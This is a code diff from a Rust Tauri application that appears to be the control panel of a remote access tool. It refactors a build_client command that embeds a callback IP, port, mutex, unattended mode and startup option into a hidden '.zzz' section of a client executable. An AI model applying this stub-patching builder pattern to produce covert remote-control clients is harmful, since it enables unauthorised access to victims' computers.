@@ -2,9 +2,6 @@ use tauri::State;
 use crate::handlers::{ SharedTauriState, FrontClient };
 use crate::server::Log;
 use serde::Serialize;
-use object::{ Object, ObjectSection };
-use std::fs::{ self, File };
-use std::io::Write;
 use std::vec;
 
 use tokio::net::TcpListener;
@@ -17,7 +14,6 @@ use crate::client::ClientWrapper;
 use std::ptr::null_mut as NULL;
 use winapi::um::winuser;
 
-use rmp_serde::Serializer;
 use tauri::AppHandle;
 
 use once_cell::sync::OnceCell;
@@ -66,7 +62,7 @@ pub async fn start_server(
        .map_err(|e| format!("Failed to set Tauri handle: {}", e))?;
 
 
-    let log = Log { event_type: "server_started".to_string(), message: "Server started on port ".to_string() + port, address: "0.0.0.0".to_string(), status: "started".to_string() };
+    let log = Log { event_type: "server_started".to_string(), message: "Server started on port ".to_string() + port };
     ctx.send(ServerCommand::Log(log)).await.unwrap();
     
     let server_task = tokio::spawn(async move {
@@ -176,47 +172,33 @@ pub async fn fetch_state(tauri_state: State<'_, SharedTauriState>) -> Result<Fro
 }
 
 #[tauri::command]
-pub fn build_client(
+pub async fn build_client(
     ip: &str,
     port: &str,
     mutex_enabled: bool,
     mutex: &str,
     unattended_mode: bool,
-    startup: bool
-) {
-    let bin_data = fs::read("target/debug/client.exe").unwrap();
-    let file = object::File::parse(&*bin_data).unwrap();
-
-    let mut output_data = bin_data.clone();
-
-    let config = common::ClientConfig {
-        ip: ip.to_string(),
-        port: port.to_string(),
-        mutex_enabled,
-        mutex: mutex.to_string(),
-        unattended_mode,
-        startup,
+    tauri_state: State<'_, SharedTauriState>
+) -> Result<String, String> {
+    let channel_tx = {
+        let tauri_state = tauri_state.0.lock().unwrap();
+        
+        if !tauri_state.running {
+            return Err("Server not running".to_string());
+        }
+        
+        if let Some(tx) = tauri_state.channel_tx.get() {
+            tx.clone()
+        } else {
+            return Err("Server channel not initialized".to_string());
+        }
     };
 
-    let mut buffer: Vec<u8> = Vec::new();
+    channel_tx.send(ServerCommand::BuildClient(ip.to_string(), port.to_string(), mutex_enabled, mutex.to_string(), unattended_mode))
+        .await
+        .map_err(|e| format!("Failed to send BuildClient command: {}", e))?;
 
-    config.serialize(&mut Serializer::new(&mut buffer)).unwrap();
-
-    let mut new_data = vec![0u8; 1024];
-
-    for (i, byte) in buffer.iter().enumerate() {
-        new_data[i] = *byte;
-    }
-
-    if let Some(section) = file.section_by_name(".zzz") {
-        let offset = section.file_range().unwrap().0 as usize;
-        let size = section.size() as usize;
-
-        output_data[offset..offset + size].copy_from_slice(&new_data);
-    }
-
-    let mut file = File::create("target/debug/Client_built.exe").unwrap();
-    let _ = file.write_all(&output_data);
+    Ok("Client built".to_string())
 }
 
 #[tauri::command]
